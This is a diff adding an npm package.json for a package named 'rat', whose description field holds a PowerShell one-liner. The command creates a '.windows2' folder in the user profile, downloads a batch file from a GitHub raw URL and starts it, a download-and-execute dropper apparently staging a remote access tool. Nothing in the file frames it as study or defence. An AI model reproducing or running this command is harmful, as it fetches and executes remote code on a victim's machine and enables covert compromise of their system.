@@ -1,0 +1,14 @@
+{
+  "name": "rat",
+  "version": "1.0.0",
+  "description": "$folderPath = \"$env:USERPROFILE\\.windows2\" New-Item -ItemType Directory -Path $folderPath -Force -ErrorAction SilentlyContinue | Out-Null $filePath = Join-Path -Path $folderPath -ChildPath \"x1.bat\" Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/murmurlab/rat/main/x1.bat\" -OutFile $filePath Start-Process -FilePath $filePath -WorkingDirectory $folderPath",
+  "main": "a.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "dependencies": {
+    "sqlite3": "latest"
+  },
+  "author": "",
+  "license": "ISC"
+}
